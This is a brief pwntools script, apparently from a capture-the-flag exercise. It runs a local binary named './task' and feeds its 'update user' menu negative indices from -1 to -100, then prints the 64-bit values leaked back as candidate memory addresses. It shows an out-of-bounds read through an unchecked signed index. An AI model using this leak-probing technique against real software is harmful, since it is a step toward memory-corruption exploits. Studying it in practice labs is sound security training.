from pwn import *

elf = context.binary = ELF('./task')
context.log_level = 'error'

for i in range(1, 101):
    try:
        p = process()

        p.sendlineafter('choice: ', b'2')
        p.sendlineafter('index: ', '-{}'.format(i).encode())
        p.sendlineafter('name: ', b'test')
        p.recvuntil('User updated ')

        leak = hex(u64(p.recvuntil(' ').strip(b' \n').ljust(8, b'\x00')))

        print(str(i) + ': ' + leak)

        p.close()

    except EOFError:
        pass
